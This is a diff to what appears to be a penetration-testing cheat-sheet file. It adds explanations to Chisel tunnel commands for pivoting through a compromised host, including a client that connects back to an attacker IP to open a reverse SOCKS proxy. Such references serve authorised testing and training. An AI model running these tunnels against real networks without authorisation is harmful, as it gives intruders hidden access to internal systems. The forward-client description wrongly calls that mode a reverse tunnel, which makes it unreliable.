@@ -94,15 +94,18 @@
   "variations": [
     {
       "label": "Forward - Client (attacker)",
-      "command": "./chisel client -v <pivot_ip>:<port> socks"
+      "command": "./chisel client -v <pivot_ip>:<port> socks",
+      "description": "Connects a Chisel client from the target back to your server, establishing a reverse tunnel. Creates a SOCKS proxy or port forward for reaching internal networks from your attack machine."
     },
     {
       "label": "Reverse - Server (attacker)",
-      "command": "sudo ./chisel server --reverse -v -p <port> --socks5"
+      "command": "sudo ./chisel server --reverse -v -p <port> --socks5",
+      "description": "Starts a Chisel tunnel server. The client on the target connects back through this server to create a SOCKS proxy or port forward for pivoting through the compromised host."
     },
     {
       "label": "Reverse - Client (pivot)",
-      "command": "./chisel client -v <attacker_ip>:<port> R:socks"
+      "command": "./chisel client -v <attacker_ip>:<port> R:socks",
+      "description": "Connects a Chisel client from the target back to your server, establishing a reverse tunnel. Creates a SOCKS proxy or port forward for reaching internal networks from your attack machine."
     }
   ],
   "opsec": "quiet",
